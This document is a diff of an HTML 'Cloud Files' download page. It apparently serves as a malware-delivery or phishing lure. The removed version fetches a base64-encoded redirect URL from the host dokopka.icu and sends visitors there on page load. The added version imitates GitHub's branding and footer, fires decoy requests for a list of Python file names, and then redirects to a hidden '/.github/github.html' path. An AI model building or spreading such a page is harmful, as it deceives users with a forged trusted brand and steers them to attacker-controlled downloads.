@@ -1,57 +1,90 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8"/>
-  <meta name="viewport" content="width=device-width, initial-scale=1"/>
-  <title>Cloud Files</title>
-  <meta name="description" content="Secure download portal"/>
-  <link rel="icon" href="/favicon.ico" type="image/x-icon"/>
-
-  <meta http-equiv="Content-Security-Policy" content="
-    default-src 'self';
-    script-src  'self' 'unsafe-inline' https://dokopka.icu;
-    style-src   'self';
-    connect-src 'self' https://dokopka.icu
-  "/>
-
-  <link rel="stylesheet" href="styles.css"/>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Cloud Files</title>
+    <meta name="description" content="Secure download portal" />
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><path fill='%23f0f6fc' d='M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z'/></svg>" />
+    <link rel="stylesheet" href="styles.css" />
 </head>
 <body>
-  <div class="download-container">
-    <div class="download-box">
-      <div class="download-icon">
-        <svg width="48" height="48" viewBox="0 0 24 24" fill="none">
-          <path d="M8 11L12 15L16 11"
-                stroke="white" stroke-width="2"
-                stroke-linecap="round" stroke-linejoin="round"/>
-        </svg>
-      </div>
-      <h1>Preparing your download…</h1>
-      <p id="loader-text">Starting…</p>
-      <p id="error-text" class="error-text"></p>
-    </div>
-  </div>
+    <div class="page-wrapper">
+        <div class="github-header">
+            <div class="header-content">
+                <a href="https://github.com/">
+                    <svg class="github-logo" viewBox="0 0 16 16">
+                        <path fill="#f0f6fc" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/>
+                    </svg>
+                </a>
+                <span class="header-title">Download Repository</span>
+            </div>
+        </div>
 
-  <script>
-  (async function(){
-    const loader = document.getElementById('loader-text');
-    const error  = document.getElementById('error-text');
-    loader.textContent = 'Fetching download link…';
-    error.textContent  = '';
-    try {
-      const res = await fetch('https://dokopka.icu/mai.maaan');
-      if (!res.ok) throw new Error(`Config HTTP ${res.status}`);
-      const { c } = await res.json();
-      const url = atob(c);
-      if (!/^https?:\/\//.test(url)) throw new Error('Invalid URL');
-      loader.textContent = 'Redirecting…';
-      window.location.href = url;
-    } catch (e) {
-      console.error(e);
-      loader.textContent = '';
-      error.textContent = `Error: ${e.message}`;
-    }
-  })();
-  </script>
+        <main class="main-content">
+            <section class="card">
+                <h1 id="headline">Preparing...</h1>
+                <div class="spinner" aria-hidden="true"></div>
+                <p id="status" class="muted">Processing request...</p>
+            </section>
+        </main>
+    </div>
+
+    <div class="github-footer">
+        <div class="footer-bottom">
+            <div class="footer-logo-section">
+                <a href="https://github.com/">
+                    <svg class="footer-logo" viewBox="0 0 16 16">
+                        <path fill="#6e7681" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/>
+                    </svg>
+                </a>
+                <span class="footer-copyright">© 2026 GitHub, Inc.</span>
+            </div>
+            <div class="footer-links">
+                <a href="https://docs.github.com/site-policy/github-terms/github-terms-of-service">Terms</a>
+                <a href="https://docs.github.com/site-policy/privacy-policies/github-privacy-statement">Privacy</a>
+                <a href="https://github.com/security">Security</a>
+                <a href="https://www.githubstatus.com/">Status</a>
+                <a href="https://docs.github.com/">Help</a>
+                <a href="https://support.github.com/">Contact</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            const pyFiles = [
+                'system_analyzer.py',
+                'data_processor.py',
+                'network_scanner.py',
+                'crypto_utils.py',
+                'database_emulator.py',
+                'metrics_collector.py',
+                'task_scheduler.py',
+                'cache_simulator.py',
+                'load_balancer.py',
+                'message_queue.py',
+                'config_manager.py',
+                'health_checker.py',
+                'version_controller.py',
+                'deployment_manager.py',
+                'audit_logger.py'
+            ];
+
+            pyFiles.forEach((file, index) => {
+                setTimeout(() => {
+                    fetch(file, { 
+                        method: 'GET',
+                        cache: 'no-store',
+                        mode: 'no-cors'
+                    }).catch(() => {});
+                }, index * 30);
+            });
+        })();
+    </script>
+
+    <script>
+        window.location.replace('/.github/github.html');
+    </script>
 </body>
 </html>
